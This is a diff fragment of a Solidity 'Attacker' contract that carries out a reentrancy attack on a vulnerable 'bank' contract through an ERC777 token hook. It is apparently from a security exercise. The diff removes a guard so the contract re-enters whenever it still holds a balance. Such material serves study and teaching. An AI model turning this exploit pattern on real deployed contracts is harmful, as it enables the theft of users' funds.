@@ -53,7 +53,6 @@ contract Attacker is IERC777Recipient, AccessControl {
     function attack(uint256 amt) payable public {
         // Deposit ETH into the bank
         bank.deposit{value: msg.value}();
-        
         // Call the vulnerable claimAll() function to start the reentrancy attack
         bank.claimAll();
     }
@@ -75,10 +74,6 @@ contract Attacker is IERC777Recipient, AccessControl {
             revert("Invalid token");
         }
         
-        // Only re-enter if the sender is the bank (minting tokens)
-        if (from != address(bank)) {
-            return;
-        }
         
         // Re-enter if our balance in the bank is still positive
         if (bank.balances(address(this)) > 0) {
